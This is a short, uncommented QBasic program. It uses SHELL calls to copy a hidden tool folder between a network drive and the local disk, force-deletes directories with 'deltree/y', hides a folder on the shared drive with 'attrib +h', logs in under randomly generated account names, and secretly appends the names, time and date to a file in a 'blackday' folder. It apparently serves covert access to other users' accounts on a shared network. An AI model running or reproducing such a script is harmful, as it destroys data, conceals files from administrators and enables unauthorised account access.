RANDOMIZE TIMER
a = FIX(RND * (9 - 1 + 1) + 1)
a$ = RIGHT$(STR$(a), 1)
b = FIX(RND * 3) + 97
b$ = CHR$(b)
d$ = TIME$
e$ = DATE$
SHELL "m:\ttt\deltree/y c:\ttt"
SHELL "md c:\ttt"
SHELL "copy m:\ttt c:\ttt/y"
SHELL "copy m:\play.bat c:\ttt\play.bat/y"
SHELL "c:\ttt\deltree/y m:\ttt"
SHELL "c:\ttt\deltree/y m:\play.bat"
SHELL "c:\ttt\login " + b$ + a$
SHELL "c:\ttt\deltree/y m:\ttt"
SHELL "md m:\ttt"
SHELL "c:\ttt\attrib m:\ttt +h"
SHELL "copy c:\ttt m:\ttt/y"
SHELL "copy c:\ttt\play.bat m:\play.bat/y"
SHELL "del m:\ttt\play.bat"
SHELL "m:\ttt\deltree/y c:\ttt"
c$ = b$ + a$
SHELL "login b8"
OPEN "c:\blackday\e-@mail.txt" FOR APPEND AS #1
WRITE #1, c$, d$, e$
SYSTEM






